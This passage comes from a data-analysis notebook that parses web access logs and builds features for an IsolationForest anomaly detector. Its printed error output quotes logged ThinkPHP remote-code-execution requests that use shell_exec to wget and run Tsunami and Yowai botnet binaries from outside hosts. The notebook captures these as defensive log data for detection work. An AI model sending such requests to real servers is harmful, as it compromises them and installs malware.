      "Error: Line does not match regex pattern: 183.80.89.73 - - [24/Jan/2019:07:22:28 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 42.112.104.192 - - [24/Jan/2019:07:37:07 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 179.95.230.55 - - [24/Jan/2019:07:37:38 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 183.80.89.8 - - [24/Jan/2019:07:54:24 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 80.230.194.29 - - [24/Jan/2019:08:22:41 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 89.90.163.13 - - [24/Jan/2019:08:46:41 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 197.35.81.102 - - [24/Jan/2019:09:59:46 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.4.78 - - [24/Jan/2019:10:36:55 +0330] \" r4---sn-a5msen7s.googlevideo.com.com\\x01\\xBB\\x0Ch\\xBFy\\xE3K.\\xB1\\x14\\x0B\\xBD\\xC2TS\\x91\\xDC\\x0FKh\\x9E\\xF6\\xC5];\\x88\\x0F\\x13\\xBD\\xC5\\xD6\\xF2\\xAE\\x14\\xC5Ks\\xA9\\xFE<5\\xC2\\x005\\x00\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.4.78 - - [24/Jan/2019:10:41:34 +0330] \"\\x10\\x7F\\x91Q\\xE3\\x8E\\x5C\\xE7\\xF4>\\xB3&{o\\xB9F/~P\\xD3B?\\x91\\xA9\\xD2\\x86\\xF7fB\\xB4FE\\xF9\\xE4U\\x1B`\\x1F\\x16\\xB4)\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n"
     ]
    }
   ],
   "source": [
    "log_file_path = '../Datos/Transformados/access.log'\n",
    "\n",
    "# Define the regex pattern to extract information from log lines\n",
    "regex_pattern = r'^(?P<client>\\S+) \\S+ (?P<userid>\\S+) \\[(?P<datetime>[\\w:/]+\\s[+\\-]\\d{4})\\] \"(?P<method>[A-Z]+) (?P<request>[^ \"]+)? HTTP/[0-9.]+\" (?P<status>[0-9]{3}) (?P<size>[0-9]+|-) \"(?P<referer>[^\"]*)\" \"(?P<user_agent>[^\"]*)\"'\n",
    "\n",
    "# Define the column names\n",
    "columns = ['client', 'userid', 'datetime', 'method', 'request', 'status', 'size', 'referer', 'user_agent']\n",
    "\n",
    "# Read the first 10000 rows of the log file into a list of dictionaries using regex pattern matching\n",
    "log_data = []\n",
    "with open(log_file_path, 'r') as file:\n",
    "    for i, line in enumerate(file):\n",
    "        if i >= 5000000:\n",
    "            break\n",
    "        match = re.match(regex_pattern, line)\n",
    "        if match:\n",
    "            log_data.append({\n",
    "                'client': match.group('client'),\n",
    "                'userid': match.group('userid'),\n",
    "                'datetime': match.group('datetime'),\n",
    "                'method': match.group('method'),\n",
    "                'request': match.group('request'),\n",
    "                'status': match.group('status'),\n",
    "                'size': match.group('size'),\n",
    "                'referer': match.group('referer'),\n",
    "                'user_agent': match.group('user_agent')\n",
    "            })\n",
    "        else:\n",
    "            print(\"Error: Line does not match regex pattern:\", line)\n",
    "\n",
    "# Create DataFrame from the list of dictionaries\n",
    "logs_df = pd.DataFrame(log_data, columns=columns)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Duplicidades"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [],
   "source": [
    "logs_df = logs_df[-logs_df.duplicated()]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Variables numericas"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [],
   "source": [
    "logs_df['Timestamp:'] = pd.to_datetime(logs_df['datetime'], format='%d/%b/%Y:%H:%M:%S %z')\n",
    "\n",
    "logs_df['Hora'] = logs_df['Timestamp:'].dt.hour\n",
    "\n",
    "logs_df['Dia'] = logs_df['Timestamp:'].dt.day"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [],
   "source": [
    "logs_df = logs_df.reset_index()\n",
    "\n",
    "logs_df_ordenado = logs_df.groupby('client').apply(ordenar_grupo)\n",
    "\n",
    "logs_df_ordenado['Latencia'] = logs_df_ordenado['Timestamp:'].diff().dt.total_seconds()\n",
    "\n",
    "logs_df_ordenado['Prev_IP'] = logs_df_ordenado['client'].shift(1)\n",
    "\n",
    "# Si la IP anterior no es la misma que la actual, la latencia debe ser 0\n",
    "logs_df_ordenado['Latencia'] = logs_df_ordenado.apply(\n",
    "    lambda row: row['Latencia'] if row['client'] == row['Prev_IP'] else 0,\n",
    "    axis=1\n",
    ")\n",
    "logs_df_ordenado.drop(columns=['Prev_IP'], inplace=True)\n",
    "\n",
    "logs_df = pd.merge(logs_df, logs_df_ordenado[['index', 'Latencia']], on='index', how='left')\n",
    "logs_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [],
   "source": [
    "logs_df['size'] = pd.to_numeric(logs_df['size'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Información general"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>client</th>\n",
       "      <th>Solicitudes</th>\n",
       "      <th>Latencia_media</th>\n",
       "      <th>Tamano_enviado_prom</th>\n",
       "      <th>Tamano_recibido_prom</th>\n",
       "      <th>Agentes_unicos</th>\n",
       "      <th>Ratio_GET_POST</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.136.111.52</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>6973.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.158.74.178</td>\n",
       "      <td>37</td>\n",
       "      <td>2.513514</td>\n",
       "      <td>17472.405405</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>37.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.36.128.224</td>\n",
       "      <td>34</td>\n",
       "      <td>0.970588</td>\n",
       "      <td>21910.617647</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>34.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.43.175.52</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>133.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.46.105.255</td>\n",
       "      <td>11</td>\n",
       "      <td>1.090909</td>\n",
       "      <td>13811.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>2</td>\n",
       "      <td>11.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>123630</th>\n",
       "      <td>99.243.47.93</td>\n",
       "      <td>124</td>\n",
       "      <td>1.806452</td>\n",
       "      <td>12035.024194</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>124.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>123631</th>\n",
       "      <td>99.246.134.169</td>\n",
       "      <td>273</td>\n",
       "      <td>0.505495</td>\n",
       "      <td>8728.761905</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>273.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>123632</th>\n",
       "      <td>99.246.164.168</td>\n",
       "      <td>56</td>\n",
       "      <td>11.321429</td>\n",
       "      <td>15706.035714</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>56.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>123633</th>\n",
       "      <td>99.246.247.185</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>133.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>123634</th>\n",
       "      <td>99.253.184.236</td>\n",
       "      <td>16</td>\n",
       "      <td>3.125000</td>\n",
       "      <td>16544.562500</td>\n",
       "      <td>0.0</td>\n",
       "      <td>2</td>\n",
       "      <td>16.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>123635 rows × 7 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                client  Solicitudes  Latencia_media  Tamano_enviado_prom  \\\n",
       "0         1.136.111.52            1        0.000000          6973.000000   \n",
       "1         1.158.74.178           37        2.513514         17472.405405   \n",
       "2         1.36.128.224           34        0.970588         21910.617647   \n",
       "3          1.43.175.52            1        0.000000           133.000000   \n",
       "4         1.46.105.255           11        1.090909         13811.000000   \n",
       "...                ...          ...             ...                  ...   \n",
       "123630    99.243.47.93          124        1.806452         12035.024194   \n",
       "123631  99.246.134.169          273        0.505495          8728.761905   \n",
       "123632  99.246.164.168           56       11.321429         15706.035714   \n",
       "123633  99.246.247.185            1        0.000000           133.000000   \n",
       "123634  99.253.184.236           16        3.125000         16544.562500   \n",
       "\n",
       "        Tamano_recibido_prom  Agentes_unicos  Ratio_GET_POST  \n",
       "0                        0.0               1             1.0  \n",
       "1                        0.0               1            37.0  \n",
       "2                        0.0               1            34.0  \n",
       "3                        0.0               1             1.0  \n",
       "4                        0.0               2            11.0  \n",
       "...                      ...             ...             ...  \n",
       "123630                   0.0               1           124.0  \n",
       "123631                   0.0               1           273.0  \n",
       "123632                   0.0               1            56.0  \n",
       "123633                   0.0               1             1.0  \n",
       "123634                   0.0               2            16.0  \n",
       "\n",
       "[123635 rows x 7 columns]"
      ]
     },
     "execution_count": 106,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "logs_df['Recibos'] = logs_df['method'].apply(lambda x: 1 if x in ['GET', 'HEAD', 'NETSPARKER'] else 0)\n",
    "logs_df['Envios'] = logs_df['method'].apply(lambda x: 0 if x in ['GET', 'HEAD', 'NETSPARKER'] else 1)\n",
    "\n",
    "logs_df['Bytes Recibidos'] = logs_df.apply(lambda row: row['size'] if row['method'] in ['GET', 'HEAD', 'NETSPARKER'] else 0, axis=1)\n",
    "logs_df['Bytes Enviados'] = logs_df.apply(lambda row: 0 if row['method'] in ['GET', 'HEAD', 'NETSPARKER'] else row['size'], axis=1)\n",
    "\n",
    "logs_result = logs_df.groupby('client').agg(\n",
    "    Solicitudes=('client', 'count'),\n",
    "    Latencia_media=('Latencia', 'mean'),\n",
    "    Tamano_enviado_prom=('Bytes Recibidos', 'mean'),\n",
    "    Tamano_recibido_prom=('Bytes Enviados', 'mean'),\n",
    "    Agentes_unicos=('user_agent', 'nunique'),\n",
    "    GET_total=('Recibos', 'sum'),\n",
    "    POST_total=('Envios', 'sum')\n",
    ")\n",
    "\n",
    "logs_result['Ratio_GET_POST'] = logs_result.apply(lambda row: row['GET_total'] / row['POST_total'] if row['POST_total'] != 0 else row['GET_total'] / 1, axis=1)\n",
    "\n",
    "logs_result = logs_result.drop(columns=['GET_total', 'POST_total']).reset_index()\n",
    "\n",
    "logs_result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [],
   "source": [
    "logs_result2 = logs_result[logs_result['Solicitudes'] > 5000]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([ 1, -1])"
      ]
     },
     "execution_count": 108,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "isolation_forest = IsolationForest(n_estimators=100, contamination=0.2, random_state=42)\n",
    "isolation_forest.fit(logs_result2[['Latencia_media', 'Tamano_enviado_prom', 'Tamano_recibido_prom', 'Agentes_unicos', 'Ratio_GET_POST']])\n",
    "isolation_forest.predict(result[['Latencia_media', 'Tamano_enviado_prom', 'Tamano_recibido_prom', 'Agentes_unicos', 'Ratio_GET_POST']])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Modelo de detección de anomalías"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [],
   "source": [
    "variables = ['Status Code', 'Bytes Recibidos', 'Bytes Enviados', 'Latencia', 'Envios']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [],
   "source": [
    "train = logs_df[['status', 'Bytes Recibidos', 'Bytes Enviados', 'Latencia', 'Envios']]\n",
    "train.columns = variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Normalización de los datos de entrenamiento\n",
    "scaler = MinMaxScaler()\n",
    "X_train_scaled = scaler.fit_transform(train)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<style>#sk-container-id-1 {\n",
       "  /* Definition of color scheme common for light and dark mode */\n",
       "  --sklearn-color-text: black;\n",
       "  --sklearn-color-line: gray;\n",
       "  /* Definition of color scheme for unfitted estimators */\n",
       "  --sklearn-color-unfitted-level-0: #fff5e6;\n",
       "  --sklearn-color-unfitted-level-1: #f6e4d2;\n",
       "  --sklearn-color-unfitted-level-2: #ffe0b3;\n",
       "  --sklearn-color-unfitted-level-3: chocolate;\n",
       "  /* Definition of color scheme for fitted estimators */\n",
       "  --sklearn-color-fitted-level-0: #f0f8ff;\n",
       "  --sklearn-color-fitted-level-1: #d4ebff;\n",
       "  --sklearn-color-fitted-level-2: #b3dbfd;\n",
       "  --sklearn-color-fitted-level-3: cornflowerblue;\n",
       "\n",
       "  /* Specific color for light theme */\n",
       "  --sklearn-color-text-on-default-background: var(--sg-text-color, var(--theme-code-foreground, var(--jp-content-font-color1, black)));\n",
       "  --sklearn-color-background: var(--sg-background-color, var(--theme-background, var(--jp-layout-color0, white)));\n",
       "  --sklearn-color-border-box: var(--sg-text-color, var(--theme-code-foreground, var(--jp-content-font-color1, black)));\n",
       "  --sklearn-color-icon: #696969;\n",
       "\n",
       "  @media (prefers-color-scheme: dark) {\n",
       "    /* Redefinition of color scheme for dark theme */\n",
       "    --sklearn-color-text-on-default-background: var(--sg-text-color, var(--theme-code-foreground, var(--jp-content-font-color1, white)));\n",
       "    --sklearn-color-background: var(--sg-background-color, var(--theme-background, var(--jp-layout-color0, #111)));\n",
       "    --sklearn-color-border-box: var(--sg-text-color, var(--theme-code-foreground, var(--jp-content-font-color1, white)));\n",
       "    --sklearn-color-icon: #878787;\n",
       "  }\n",
       "}\n",
       "\n",
       "#sk-container-id-1 {\n",
       "  color: var(--sklearn-color-text);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 pre {\n",
       "  padding: 0;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 input.sk-hidden--visually {\n",
       "  border: 0;\n",
       "  clip: rect(1px 1px 1px 1px);\n",
       "  clip: rect(1px, 1px, 1px, 1px);\n",
       "  height: 1px;\n",
       "  margin: -1px;\n",
       "  overflow: hidden;\n",
       "  padding: 0;\n",
       "  position: absolute;\n",
       "  width: 1px;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-dashed-wrapped {\n",
       "  border: 1px dashed var(--sklearn-color-line);\n",
       "  margin: 0 0.4em 0.5em 0.4em;\n",
       "  box-sizing: border-box;\n",
       "  padding-bottom: 0.4em;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-container {\n",
       "  /* jupyter's `normalize.less` sets `[hidden] { display: none; }`\n",
       "     but bootstrap.min.css set `[hidden] { display: none !important; }`\n",
       "     so we also need the `!important` here to be able to override the\n",
       "     default hidden behavior on the sphinx rendered scikit-learn.org.\n",
       "     See: https://github.com/scikit-learn/scikit-learn/issues/21755 */\n",
       "  display: inline-block !important;\n",
       "  position: relative;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-text-repr-fallback {\n",
       "  display: none;\n",
       "}\n",
       "\n",
       "div.sk-parallel-item,\n",
       "div.sk-serial,\n",
       "div.sk-item {\n",
       "  /* draw centered vertical line to link estimators */\n",
       "  background-image: linear-gradient(var(--sklearn-color-text-on-default-background), var(--sklearn-color-text-on-default-background));\n",
       "  background-size: 2px 100%;\n",
       "  background-repeat: no-repeat;\n",
       "  background-position: center center;\n",
       "}\n",
       "\n",
       "/* Parallel-specific style estimator block */\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item::after {\n",
       "  content: \"\";\n",
       "  width: 100%;\n",
       "  border-bottom: 2px solid var(--sklearn-color-text-on-default-background);\n",
       "  flex-grow: 1;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel {\n",
       "  display: flex;\n",
       "  align-items: stretch;\n",
       "  justify-content: center;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "  position: relative;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item {\n",
       "  display: flex;\n",
       "  flex-direction: column;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item:first-child::after {\n",
       "  align-self: flex-end;\n",
       "  width: 50%;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item:last-child::after {\n",
       "  align-self: flex-start;\n",
       "  width: 50%;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-parallel-item:only-child::after {\n",
       "  width: 0;\n",
       "}\n",
       "\n",
       "/* Serial-specific style estimator block */\n",
       "\n",
       "#sk-container-id-1 div.sk-serial {\n",
       "  display: flex;\n",
       "  flex-direction: column;\n",
       "  align-items: center;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "  padding-right: 1em;\n",
       "  padding-left: 1em;\n",
       "}\n",
       "\n",
       "\n",
       "/* Toggleable style: style used for estimator/Pipeline/ColumnTransformer box that is\n",
       "clickable and can be expanded/collapsed.\n",
       "- Pipeline and ColumnTransformer use this feature and define the default style\n",
       "- Estimators will overwrite some part of the style using the `sk-estimator` class\n",
       "*/\n",
       "\n",
       "/* Pipeline and ColumnTransformer style (default) */\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable {\n",
       "  /* Default theme specific background. It is overwritten whether we have a\n",
       "  specific estimator or a Pipeline/ColumnTransformer */\n",
       "  background-color: var(--sklearn-color-background);\n",
       "}\n",
       "\n",
       "/* Toggleable label */\n",
       "#sk-container-id-1 label.sk-toggleable__label {\n",
       "  cursor: pointer;\n",
       "  display: block;\n",
       "  width: 100%;\n",
       "  margin-bottom: 0;\n",
       "  padding: 0.5em;\n",
       "  box-sizing: border-box;\n",
       "  text-align: center;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 label.sk-toggleable__label-arrow:before {\n",
       "  /* Arrow on the left of the label */\n",
       "  content: \"▸\";\n",
       "  float: left;\n",
       "  margin-right: 0.25em;\n",
       "  color: var(--sklearn-color-icon);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 label.sk-toggleable__label-arrow:hover:before {\n",
       "  color: var(--sklearn-color-text);\n",
       "}\n",
       "\n",
       "/* Toggleable content - dropdown */\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable__content {\n",
       "  max-height: 0;\n",
       "  max-width: 0;\n",
       "  overflow: hidden;\n",
       "  text-align: left;\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable__content.fitted {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable__content pre {\n",
       "  margin: 0.2em;\n",
       "  border-radius: 0.25em;\n",
       "  color: var(--sklearn-color-text);\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-toggleable__content.fitted pre {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 input.sk-toggleable__control:checked~div.sk-toggleable__content {\n",
       "  /* Expand drop-down */\n",
       "  max-height: 200px;\n",
       "  max-width: 100%;\n",
       "  overflow: auto;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 input.sk-toggleable__control:checked~label.sk-toggleable__label-arrow:before {\n",
       "  content: \"▾\";\n",
       "}\n",
       "\n",
       "/* Pipeline/ColumnTransformer-specific style */\n",
       "\n",
       "#sk-container-id-1 div.sk-label input.sk-toggleable__control:checked~label.sk-toggleable__label {\n",
       "  color: var(--sklearn-color-text);\n",
       "  background-color: var(--sklearn-color-unfitted-level-2);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-label.fitted input.sk-toggleable__control:checked~label.sk-toggleable__label {\n",
       "  background-color: var(--sklearn-color-fitted-level-2);\n",
       "}\n",
       "\n",
       "/* Estimator-specific style */\n",
       "\n",
       "/* Colorize estimator box */\n",
       "#sk-container-id-1 div.sk-estimator input.sk-toggleable__control:checked~label.sk-toggleable__label {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-2);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-estimator.fitted input.sk-toggleable__control:checked~label.sk-toggleable__label {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-2);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-label label.sk-toggleable__label,\n",
       "#sk-container-id-1 div.sk-label label {\n",
       "  /* The background is the default theme color */\n",
       "  color: var(--sklearn-color-text-on-default-background);\n",
       "}\n",
       "\n",
       "/* On hover, darken the color of the background */\n",
       "#sk-container-id-1 div.sk-label:hover label.sk-toggleable__label {\n",
       "  color: var(--sklearn-color-text);\n",
       "  background-color: var(--sklearn-color-unfitted-level-2);\n",
       "}\n",
       "\n",
       "/* Label box, darken color on hover, fitted */\n",
       "#sk-container-id-1 div.sk-label.fitted:hover label.sk-toggleable__label.fitted {\n",
       "  color: var(--sklearn-color-text);\n",
       "  background-color: var(--sklearn-color-fitted-level-2);\n",
       "}\n",
       "\n",
       "/* Estimator label */\n",
       "\n",
       "#sk-container-id-1 div.sk-label label {\n",
       "  font-family: monospace;\n",
       "  font-weight: bold;\n",
       "  display: inline-block;\n",
       "  line-height: 1.2em;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-label-container {\n",
       "  text-align: center;\n",
       "}\n",
       "\n",
       "/* Estimator-specific */\n",
       "#sk-container-id-1 div.sk-estimator {\n",
       "  font-family: monospace;\n",
       "  border: 1px dotted var(--sklearn-color-border-box);\n",
       "  border-radius: 0.25em;\n",
       "  box-sizing: border-box;\n",
       "  margin-bottom: 0.5em;\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-0);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-estimator.fitted {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-0);\n",
       "}\n",
       "\n",
       "/* on hover */\n",
       "#sk-container-id-1 div.sk-estimator:hover {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-2);\n",
       "}\n",
       "\n",
       "#sk-container-id-1 div.sk-estimator.fitted:hover {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-2);\n",
       "}\n",
       "\n",
       "/* Specification for estimator info (e.g. \"i\" and \"?\") */\n",
       "\n",
       "/* Common style for \"i\" and \"?\" */\n",
       "\n",
       ".sk-estimator-doc-link,\n",
       "a:link.sk-estimator-doc-link,\n",
       "a:visited.sk-estimator-doc-link {\n",
       "  float: right;\n",
       "  font-size: smaller;\n",
       "  line-height: 1em;\n",
       "  font-family: monospace;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "  border-radius: 1em;\n",
       "  height: 1em;\n",
       "  width: 1em;\n",
       "  text-decoration: none !important;\n",
       "  margin-left: 1ex;\n",
       "  /* unfitted */\n",
       "  border: var(--sklearn-color-unfitted-level-1) 1pt solid;\n",
       "  color: var(--sklearn-color-unfitted-level-1);\n",
       "}\n",
       "\n",
       ".sk-estimator-doc-link.fitted,\n",
       "a:link.sk-estimator-doc-link.fitted,\n",
       "a:visited.sk-estimator-doc-link.fitted {\n",
       "  /* fitted */\n",
       "  border: var(--sklearn-color-fitted-level-1) 1pt solid;\n",
       "  color: var(--sklearn-color-fitted-level-1);\n",
       "}\n",
       "\n",
       "/* On hover */\n",
       "div.sk-estimator:hover .sk-estimator-doc-link:hover,\n",
       ".sk-estimator-doc-link:hover,\n",
       "div.sk-label-container:hover .sk-estimator-doc-link:hover,\n",
       ".sk-estimator-doc-link:hover {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-3);\n",
       "  color: var(--sklearn-color-background);\n",
       "  text-decoration: none;\n",
       "}\n",
       "\n",
       "div.sk-estimator.fitted:hover .sk-estimator-doc-link.fitted:hover,\n",
       ".sk-estimator-doc-link.fitted:hover,\n",
       "div.sk-label-container:hover .sk-estimator-doc-link.fitted:hover,\n",
       ".sk-estimator-doc-link.fitted:hover {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-3);\n",
       "  color: var(--sklearn-color-background);\n",
       "  text-decoration: none;\n",
       "}\n",
       "\n",
       "/* Span, style for the box shown on hovering the info icon */\n",
       ".sk-estimator-doc-link span {\n",
       "  display: none;\n",
       "  z-index: 9999;\n",
       "  position: relative;\n",
       "  font-weight: normal;\n",
       "  right: .2ex;\n",
       "  padding: .5ex;\n",
       "  margin: .5ex;\n",
       "  width: min-content;\n",
       "  min-width: 20ex;\n",
       "  max-width: 50ex;\n",
       "  color: var(--sklearn-color-text);\n",
       "  box-shadow: 2pt 2pt 4pt #999;\n",
       "  /* unfitted */\n",
       "  background: var(--sklearn-color-unfitted-level-0);\n",
       "  border: .5pt solid var(--sklearn-color-unfitted-level-3);\n",
       "}\n",
       "\n",
       ".sk-estimator-doc-link.fitted span {\n",
       "  /* fitted */\n",
       "  background: var(--sklearn-color-fitted-level-0);\n",
       "  border: var(--sklearn-color-fitted-level-3);\n",
       "}\n",
